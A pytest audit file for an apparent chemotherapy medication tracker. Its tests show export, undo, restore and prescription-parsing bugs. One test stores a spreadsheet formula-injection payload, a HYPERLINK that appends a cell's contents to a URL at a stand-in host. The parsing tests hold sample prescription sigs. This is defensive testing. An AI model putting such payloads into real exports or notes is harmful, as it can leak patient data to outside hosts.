"""Audit reproductions: data integrity and medical defaults.

Every test here FAILS on the audited commit (624de25, v0.5.1) for the reason in its docstring.
Findings with severity, root cause and proposed fix: audit-findings/integrity.md.
"""

from __future__ import annotations

import csv
import dataclasses
import html
import io
import re
import time as _time
from datetime import datetime, timedelta

import openpyxl
import pytest

from chemotracker import backup, export, history, rxparse, schedule, store
from chemotracker.db import session

from .conftest import local_now, setup_walkthrough, today

# ---------------------------------------------------------------- helpers


def _plan(conn, med_name, kind="scheduled"):
    return conn.execute("""SELECT p.* FROM plans p JOIN medications m ON m.id = p.medication_id
                            WHERE m.name = ? AND p.kind = ?""", (med_name, kind)).fetchone()


def _med_id(conn, med_name):
    return conn.execute("SELECT id FROM medications WHERE name = ?", (med_name,)).fetchone()["id"]


def _post_ok(client, url, data):
    """Post like a person who reads any warning page and then confirms (the confirm is part of the scenario)."""
    r = client.post(url, data=data, follow_redirects=False)
    if r.status_code != 303:
        r = client.post(url, data={**data, "confirm": "1", "clinic_ok": "1"}, follow_redirects=False)
    assert r.status_code == 303, r.text[:500]
    return r


def _log_slot(client, plan, key, taken_at: str):
    return _post_ok(client, "/slot", {"plan_id": plan["id"], "slot": key, "status": "taken", "taken_at": taken_at,
                                      "back": "/"})


def _slot_log_id(conn, plan, key):
    return conn.execute("SELECT id FROM dose_logs WHERE plan_id = ? AND slot = ?", (plan["id"], key)).fetchone()["id"]


def _text(r) -> str:
    return html.unescape(re.sub(r"<[^>]+>", " ", r.text))


# ---------------------------------------------------------------- report: formula injection (P1)


def _dose_with_note(client, cfg, note):
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    with session(cfg.db_path) as conn:
        plan = _plan(conn, "Dexamethasone")
    key = f"{y.isoformat()} 08:00"
    _log_slot(client, plan, key, f"{y.isoformat()}T08:05")
    with session(cfg.db_path) as conn:
        log_id = _slot_log_id(conn, plan, key)
    r = client.post(f"/dose/{log_id}", data={"status": "taken", "taken_at": f"{y.isoformat()}T08:05",
                                             "dose": "2 tablets (4 mg)", "notes": note, "back": "/"},
                    follow_redirects=False)
    assert r.status_code == 303
    return y


def test_excel_report_turns_a_typed_note_into_a_live_formula(client, cfg):
    """A note typed into a dose ('=HYPERLINK(...)') is written to the clinic's Excel file as a working formula.

    openpyxl stores any string that starts with '=' as a formula (data_type 'f'), and export.py writes
    notes, names and label text without neutralising them.
    """
    note = '=HYPERLINK("http://example.invalid/?d="&A1,"Open")'
    y = _dose_with_note(client, cfg, note)
    r = client.get(f"/report.xlsx?start={y.isoformat()}&end={y.isoformat()}")
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    formulas = [(ws.title, c.coordinate, c.value) for ws in wb.worksheets for row in ws.iter_rows() for c in row
                if c.data_type == "f"]
    assert formulas == [], f"user text became Excel formulas: {formulas}"


def test_csv_report_writes_formula_text_unescaped(client, cfg):
    """The doses CSV writes a note that starts with '=' as-is, so Excel runs it as a formula when the clinic opens it."""
    y = _dose_with_note(client, cfg, "=1+2")
    r = client.get(f"/report-doses.csv?start={y.isoformat()}&end={y.isoformat()}")
    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig"))))
    notes_col = rows[0].index("Notes")
    notes = [row[notes_col] for row in rows[1:] if row[notes_col]]
    assert notes and not any(n[:1] in "=+-@" for n in notes), f"formula-like cells in the CSV: {notes}"


# ---------------------------------------------------------------- put back (P1)


def test_put_back_after_the_dose_was_logged_again_makes_a_duplicate(client, cfg):
    """Delete a dose, log the same dose again from "Log a dose", then Put back: two Taken rows for one planned dose.

    history.put_back only refuses when the same (plan_id, slot) row exists. A re-log from "Log a dose" has
    plan_id NULL and is paired to the slot by schedule._pair_logs, so the check misses it.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    key = f"{y.isoformat()} 08:00"
    with session(cfg.db_path) as conn:
        plan = _plan(conn, "Dexamethasone")
        med = _med_id(conn, "Dexamethasone")
        olz = _plan(conn, "Olanzapine")
    _log_slot(client, plan, key, f"{y.isoformat()}T08:05")
    # A later dose of another medicine, so SQLite doesn't hand the deleted id to the re-log (see the next test).
    _log_slot(client, olz, f"{y.isoformat()} 21:00", f"{y.isoformat()}T21:05")
    with session(cfg.db_path) as conn:
        first = _slot_log_id(conn, plan, key)
    client.post(f"/dose/{first}/delete", data={"back": "/"}, follow_redirects=False)
    _post_ok(client, "/dose/new", {"medication_id": str(med), "taken_at": f"{y.isoformat()}T08:05", "back": "/"})
    with session(cfg.db_path) as conn:
        event = conn.execute("SELECT id FROM history WHERE entity = 'dose' AND action = 'deleted' AND ref = ?",
                             (str(first),)).fetchone()["id"]
    client.post(f"/history/{event}/put-back", data={"back": "/history"}, follow_redirects=False)
    with session(cfg.db_path) as conn:
        rows = export.dose_rows(conn, y, y, local_now(cfg))
    taken = [r for r in rows if r.medicine.startswith("Dexamethasone") and r.status == "Taken"]
    assert len(taken) == 1, f"the care-team report now shows {len(taken)} Dexamethasone doses for one planned dose"


def test_put_back_says_already_back_when_sqlite_reused_the_deleted_id(client, cfg):
    """Delete the newest dose, log any other dose, then Put back: "It's already back." but the dose is NOT back.

    dose_logs.id is INTEGER PRIMARY KEY without AUTOINCREMENT, so SQLite gives the next row the id of the deleted
    newest row. history.put_back treats "a row with that id exists" as "already back", and the reused id also mixes
    the deleted dose's history into the new dose's page.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    key = f"{y.isoformat()} 08:00"
    with session(cfg.db_path) as conn:
        dex = _plan(conn, "Dexamethasone")
        ond = _med_id(conn, "Ondansetron")
    _log_slot(client, dex, key, f"{y.isoformat()}T08:05")
    with session(cfg.db_path) as conn:
        gone = _slot_log_id(conn, dex, key)
    client.post(f"/dose/{gone}/delete", data={"back": "/"}, follow_redirects=False)
    _post_ok(client, "/dose/new", {"medication_id": str(ond), "taken_at": f"{y.isoformat()}T10:00", "back": "/"})
    with session(cfg.db_path) as conn:
        event = conn.execute("SELECT id FROM history WHERE entity = 'dose' AND action = 'deleted' AND ref = ?",
                             (str(gone),)).fetchone()["id"]
    r = client.post(f"/history/{event}/put-back", data={"back": "/history"}, follow_redirects=False)
    told = _text(client.get(r.headers["location"]))
    with session(cfg.db_path) as conn:
        back = conn.execute("SELECT 1 FROM dose_logs WHERE plan_id = ? AND slot = ?", (dex["id"], key)).fetchone()
    assert back is not None, f"Dexamethasone dose not restored; page says 'already back': {'already back' in told}"


def test_deleted_medicine_history_takes_the_name_of_the_next_medicine_added(client, cfg):
    """Delete the newest medicine, add another: the deleted one's dose history now shows the NEW medicine's name.

    medications.id is reused like dose ids, and history._names() fills names from current medicines first, so the
    History page and the Excel "Change history" sheet say "Pegfilgrastim" for doses that were another drug.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    with session(cfg.db_path) as conn:
        newest = conn.execute("SELECT id, name FROM medications ORDER BY id DESC LIMIT 1").fetchone()
    _post_ok(client, "/dose/new", {"medication_id": str(newest["id"]), "taken_at": f"{y.isoformat()}T10:00", "back": "/"})
    client.post(f"/medicines/{newest['id']}/delete", follow_redirects=False)
    with session(cfg.db_path, write=True) as conn:
        new_id = store.add_from_catalog(conn, "pegfilgrastim")
    assert new_id == newest["id"]  # precondition: SQLite reused the id
    with session(cfg.db_path) as conn:
        deleted = [e for e in history.events(conn, cfg.tz, entity="dose") if e.action == "deleted"]
    assert deleted and all(e.subject == newest["name"] for e in deleted), \
        f"deleted {newest['name']} doses are shown as: {[e.subject for e in deleted]}"


# ---------------------------------------------------------------- restore (P1/P2)


def test_restore_page_does_not_say_what_will_be_lost_when_counts_match(client, cfg):
    """Backup has dose A. Since then A was deleted and dose B logged. The page shows "1 | 1" and never names B.

    restore.html compares only table counts (web.py restore_page), so a restore that drops B and brings back A
    looks like nothing changes.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    with session(cfg.db_path) as conn:
        dex, olz = _plan(conn, "Dexamethasone"), _plan(conn, "Olanzapine")
    _log_slot(client, dex, f"{y.isoformat()} 08:00", f"{y.isoformat()}T08:05")
    saved = backup.run_backup(cfg, "manual")
    assert saved.ok
    with session(cfg.db_path) as conn:
        a = _slot_log_id(conn, dex, f"{y.isoformat()} 08:00")
    client.post(f"/dose/{a}/delete", data={"back": "/"}, follow_redirects=False)
    _log_slot(client, olz, f"{y.isoformat()} 21:00", f"{y.isoformat()}T21:05")
    client.get("/settings")  # consume the "Olanzapine taken" toast so it can't satisfy the check below
    page = _text(client.get(f"/settings/restore?file={saved.path.name}"))
    assert "Olanzapine" in page or re.search(r"\b1 dose", page), \
        "the restore page doesn't tell the person that the Olanzapine dose logged since the backup will be lost"


def test_uploaded_backup_is_described_by_its_upload_time(client, cfg, monkeypatch):
    """An old backup uploaded days later is shown as taken at the upload time.

    save_upload names the file with the upload time and describe() reads the time from the name, so the page
    says "Anything logged after <upload time> won't show any more" although everything since the backup was made
    (here: a dose logged before the upload) will be gone.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    old = backup.run_backup(cfg, "manual")
    data = old.path.read_bytes()
    with session(cfg.db_path) as conn:
        olz = _plan(conn, "Olanzapine")
    _log_slot(client, olz, f"{y.isoformat()} 21:00", f"{y.isoformat()}T21:05")

    class _ThreeDaysLater(datetime):
        @classmethod
        def now(cls, tz=None):
            return datetime.now(tz) + timedelta(days=3)

    monkeypatch.setattr(backup, "datetime", _ThreeDaysLater)  # the upload happens three days after the backup
    r = client.post("/settings/restore/upload", files={"file": ("chemo-backup.sqlite3", data, "application/octet-stream")},
                    follow_redirects=False)
    assert r.status_code == 303 and "/settings/restore?" in r.headers["location"], r.text[:300]
    page = _text(client.get(r.headers["location"]))
    later = schedule.fmt_day(today(cfg) + timedelta(days=3))
    assert later not in page, f"the page dates the backup to the upload day ({later}), not to when it was made"


def test_before_restore_safety_copy_is_pruned_by_normal_rotation(client, cfg):
    """The copy made before a restore ("so you can switch back") is deleted by the ordinary backup rotation.

    prune() keeps the newest BACKUP_KEEP files of every kind, so -before-restore (and -uploaded) copies age out
    like daily ones; with hourly backups and keep=30 the way back is gone after about a day.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    small = dataclasses.replace(cfg, backup_keep=2)
    first = backup.run_backup(small, "manual")
    _time.sleep(1.1)
    safety = backup.restore(small, first.path, None)
    for _ in range(2):
        _time.sleep(1.1)
        assert backup.run_backup(small, "scheduled").ok
    assert safety.exists(), "the only copy of the record from before the restore was pruned"


# ---------------------------------------------------------------- report vs cycle sheet (P1/P2)


def test_stopping_a_medicine_hides_its_missed_and_taken_doses_from_the_report(client, cfg):
    """Stop Dexamethasone on Day 4: its missed Day 2 dose stops showing as "Not logged" and its row leaves the cycle sheet.

    schedule.PLAN_SQL filters `m.active = 1`, so slots(), grid() and export.dose_rows() forget every past slot of a
    stopped medicine. The Dose log still lists the taken dose, the Cycle grid no longer has the medicine at all.
    """
    day1 = today(cfg) - timedelta(days=3)  # today is Day 4
    setup_walkthrough(client, day1)
    d2, d3 = day1 + timedelta(days=1), day1 + timedelta(days=2)
    with session(cfg.db_path) as conn:
        dex = _plan(conn, "Dexamethasone")
    _log_slot(client, dex, f"{d3.isoformat()} 08:00", f"{d3.isoformat()}T08:10")  # Day 2 missed, Day 3 taken
    r = client.post(f"/medicines/{dex['medication_id']}/active", data={"active": "0"}, follow_redirects=False)
    assert r.status_code == 303
    with session(cfg.db_path) as conn:
        rows = export.dose_rows(conn, day1, today(cfg), local_now(cfg))
        cycle = schedule.cycle_for_date(conn, d2)
        _, grid_rows, _ = schedule.grid(conn, cycle, local_now(cfg))
    missed = [r for r in rows if r.medicine.startswith("Dexamethasone") and r.status == "Not logged" and r.day == 2]
    assert missed, "the missed Day 2 Dexamethasone dose vanished from the care-team report when the medicine was stopped"
    assert any(g.name == "Dexamethasone" for g in grid_rows), "the cycle sheet dropped Dexamethasone and its taken dose"


@pytest.mark.xfail(strict=True, reason="integrity F15: the cycle sheet part is fixed in schedule.grid (also covered by "
                   "test_audit_schedule F5); export.dose_rows still takes Cycle/Day from the taken time "
                   "(export.py, owned by another fixer)")
def test_bedtime_dose_taken_after_midnight_leaves_its_planned_day_blank_on_the_cycle_sheet(client, cfg):
    """Day 4's 9 PM Olanzapine, taken at 12:30 AM: the cycle sheet shows Day 4 blank and a dose on Day 5.

    grid() files logs by taken_at's date while the slot pairing (no "!" on Day 4) uses the planned slot, and
    dose_rows() takes Cycle/Day from taken_at too; Day 5 isn't an Olanzapine day.
    """
    day1 = today(cfg) - timedelta(days=5)  # Day 4 = 2 days ago, Day 5 = yesterday
    setup_walkthrough(client, day1)
    d4, d5 = day1 + timedelta(days=3), day1 + timedelta(days=4)
    with session(cfg.db_path) as conn:
        olz = _plan(conn, "Olanzapine")
    _log_slot(client, olz, f"{d4.isoformat()} 21:00", f"{d5.isoformat()}T00:30")
    with session(cfg.db_path) as conn:
        cycle = schedule.cycle_for_date(conn, d4)
        _, grid_rows, _ = schedule.grid(conn, cycle, local_now(cfg))
        rows = export.dose_rows(conn, day1, today(cfg), local_now(cfg))
    cells = next(g for g in grid_rows if g.name == "Olanzapine").cells
    assert len(cells[4].taken) == 1 and not cells[5].taken, \
        f"Day 4 shows taken={len(cells[4].taken)} missing={cells[4].missing}; Day 5 shows taken={len(cells[5].taken)}"
    row = next(r for r in rows if r.medicine.startswith("Olanzapine") and r.status == "Taken")
    assert row.day == 4, f"the Dose log files the Day 4 bedtime dose under Day {row.day}"


def test_log_a_dose_for_a_scheduled_slot_is_filed_in_the_as_needed_row(client, cfg):
    """Ondansetron scheduled Days 1-3 at 8 AM plus as-needed Days 4-6. "Log a dose" at 8:05 on Day 2 fills the
    scheduled slot (no "!"), but the cycle sheet puts the tick in the As needed row on a day it isn't allowed and
    leaves the Scheduled cell blank; the Dose log calls it "As needed".

    store.log_dose always writes kind 'as_needed' (store.py:454) and grid() picks the row by the log's kind
    (schedule.py:1050) while _pair_logs counts it for the scheduled slot.
    """
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)  # Day 2
    with session(cfg.db_path) as conn:
        ond = _med_id(conn, "Ondansetron")
    r = client.post(f"/medicines/{ond}/plans", data={"kind": "scheduled", "start_day": "1", "end_day": "3", "times": "08:00",
                                                     "from_cycle": "1"}, follow_redirects=False)
    assert r.status_code == 303
    _post_ok(client, "/dose/new", {"medication_id": str(ond), "taken_at": f"{y.isoformat()}T08:05", "back": "/"})
    with session(cfg.db_path) as conn:
        cycle = schedule.cycle_for_date(conn, y)
        _, grid_rows, _ = schedule.grid(conn, cycle, local_now(cfg))
        rows = export.dose_rows(conn, y, y, local_now(cfg))
    sched = next(g for g in grid_rows if g.name == "Ondansetron" and g.kind == "scheduled").cells[2]
    prn = next(g for g in grid_rows if g.name == "Ondansetron" and g.kind == "as_needed").cells[2]
    assert len(sched.taken) == 1 and not prn.taken, \
        f"Scheduled Day 2: taken={len(sched.taken)} missing={sched.missing}; As needed Day 2: taken={len(prn.taken)}"
    assert [r.kind for r in rows if r.medicine.startswith("Ondansetron")] == ["Scheduled"]


def test_deleting_a_medicine_removes_given_doses_from_the_care_team_report(client, cfg):
    """"Delete this medicine" cascades to every dose (dose_logs ON DELETE CASCADE): the report then lacks doses that were given."""
    setup_walkthrough(client, today(cfg) - timedelta(days=2))
    y = today(cfg) - timedelta(days=1)
    with session(cfg.db_path) as conn:
        fil = _plan(conn, "Filgrastim")
    _log_slot(client, fil, f"{y.isoformat()} 15:00", f"{y.isoformat()}T15:05")
    client.post(f"/medicines/{fil['medication_id']}/delete", follow_redirects=False)
    with session(cfg.db_path) as conn:
        rows = export.dose_rows(conn, y, y, local_now(cfg))
    assert any(r.medicine.startswith("Filgrastim") and r.status == "Taken" for r in rows), \
        "a Filgrastim shot that was given is gone from the report"


# ---------------------------------------------------------------- prescription reader (P0/P1/P2)


def _one(text):
    meds = rxparse.parse(text)
    assert len(meds) == 1, meds
    return meds[0]


def _doses_per_cycle(m) -> int:
    return sum(len(p.times or [None]) * len(p.days) for p in m.plans if p.kind == "scheduled")


def test_reader_three_times_a_day_for_5_days_becomes_day_1_only():
    """'3 times a day for 5 days' is saved as Day 1 only, no note. The label's 5 days are dropped."""
    m = _one("Prochlorperazine 10 mg tablet - Take 1 tablet by mouth 3 times a day for 5 days")
    p = m.plans[0]
    assert len(p.days) == 5, f"plan covers days {p.start_day}-{p.end_day}; notes={m.notes}"


def test_reader_do_not_take_at_bedtime_schedules_it_at_bedtime():
    """'twice daily ... Do not take at bedtime' becomes ONE dose AT bedtime (label 'At bedtime with food')."""
    m = _one("Dexamethasone 4 mg tablet - Take 1 tablet twice daily with food on days 2-4. Do not take at bedtime")
    times = m.plans[0].times
    assert "21:00" not in times and len(times) == 2, f"times={times} label={m.plans[0].label!r}"


def test_reader_72_hour_patch_is_scheduled_every_day():
    """'Apply 1 patch every 72 hours' (fentanyl) becomes a new patch every day at 8 AM, with no note: 3x the dose."""
    m = _one("Fentanyl 25 mcg/hr patch - Apply 1 patch to the skin every 72 hours")
    daily = any(p.kind == "scheduled" and len(p.times) >= 1 and (p.end_day is None or p.end_day > p.start_day)
                for p in m.plans)
    flagged = any("72" in n for n in m.notes)
    assert not daily or flagged, f"plans={m.plans} notes={m.notes}"


def test_reader_mg_daily_limit_is_read_as_a_count_of_doses():
    """'Do not exceed 24 mg per day' with 8 mg tablets is saved as 'up to 24 a day' instead of 3 doses."""
    m = _one("Ondansetron 8 mg tablet - Take 1 tablet every 8 hours as needed for nausea. Do not exceed 24 mg per day")
    assert m.max_per_day in (3, None) and (m.max_per_day == 3 or any("24 mg" in n for n in m.notes)), \
        f"max_per_day={m.max_per_day} notes={m.notes}"


def test_reader_drops_not_more_than_n_tablets_a_day():
    """'not more than 3 tablets a day' is ignored: no limit and no note, while every-4-hours allows 6 a day."""
    m = _one("Prochlorperazine 10 mg tablet - Take 1 tablet every 4 hours as needed, not more than 3 tablets a day")
    assert m.max_per_day == 3 or any("3 tablets" in n for n in m.notes), f"max_per_day={m.max_per_day} notes={m.notes}"


def test_reader_around_the_clock_is_saved_as_as_needed():
    """'every 8 hours around the clock for 3 days' becomes as-needed; the note even says 'change it if around the clock'."""
    m = _one("Ondansetron 8 mg tablet - Take 1 tablet every 8 hours around the clock for 3 days")
    assert m.plans[0].kind == "scheduled", f"kind={m.plans[0].kind} notes={m.notes}"


@pytest.mark.parametrize("text, doses", [
    ("Dexamethasone 4 mg tablet - Take 2 tablets the night before chemo and 2 tablets the morning of chemo", 2),
    ("Dexamethasone 4 mg tablet - Take 5 tablets (20 mg) by mouth 12 hours and 6 hours before chemo", 2),
    ("Dexamethasone 4 mg tablet - Take 1 tablet every 6 hours x 4 doses starting the night before chemo", 4),
])
def test_reader_loses_steroid_premedication_doses(text, doses):
    """Premedication sigs lose doses silently: 'night before and morning of chemo' -> one 8 AM dose the day before."""
    m = _one(text)
    assert _doses_per_cycle(m) == doses, f"plans={[(p.start_day, p.end_day, p.times) for p in m.plans]} notes={m.notes}"


def test_reader_eight_times_a_day_becomes_once_a_day():
    """'8 times a day' is saved as once a day on Day 1, with no note that the frequency wasn't understood."""
    m = _one("Ondansetron 8 mg tablet - Take 1 tablet by mouth 8 times a day")
    assert len(m.plans[0].times) == 8 or any("8 times" in n for n in m.notes), f"times={m.plans[0].times} notes={m.notes}"


def test_reader_drops_the_as_needed_step_after_then():
    """'every 8 hours for 2 days, then every 8 hours as needed': the as-needed part after Day 2 disappears."""
    m = _one("Ondansetron 8 mg tablet - Take 1 tablet by mouth every 8 hours for 2 days, then every 8 hours as needed")
    later = [p for p in m.plans if p.end_day is None or p.end_day > 2]
    assert later, f"plans={[(p.kind, p.start_day, p.end_day) for p in m.plans]} notes={m.notes}"


def test_on_body_injector_keeps_the_catalog_fridge_reminder(cfg):
    """An on-body injector label saves as a home shot on Day 2 with 'Take it out of the fridge' 30 min before.

    store.import_parsed -> add_from_catalog copies pegfilgrastim's syringe prep (store.py:168) and only overwrites
    prep when the label set one, so the device worn from the clinic gets fridge and shot reminders.
    """
    m = _one("Pegfilgrastim 6 mg/0.6 mL on-body injector - Delivers the dose about 27 hours after it is applied")
    with session(cfg.db_path, write=True) as conn:
        med_id = store.import_parsed(conn, m, None)
        row = store.medication(conn, med_id)
    assert not row["prep_minutes"], f"prep={row['prep_minutes']} {row['prep_note']!r}, plans={m.plans}"


def test_reader_accepts_a_dose_unit_that_contradicts_the_strength():
    """A dose of '8 mcg' for an 8 mg tablet (1000x) is accepted with no note."""
    m = _one("Ondansetron 8 mg tablet - Take 8 mcg by mouth every 8 hours as needed")
    assert any("mcg" in n for n in m.notes), f"dose={m.dose!r} strength={m.strength!r} notes={m.notes}"
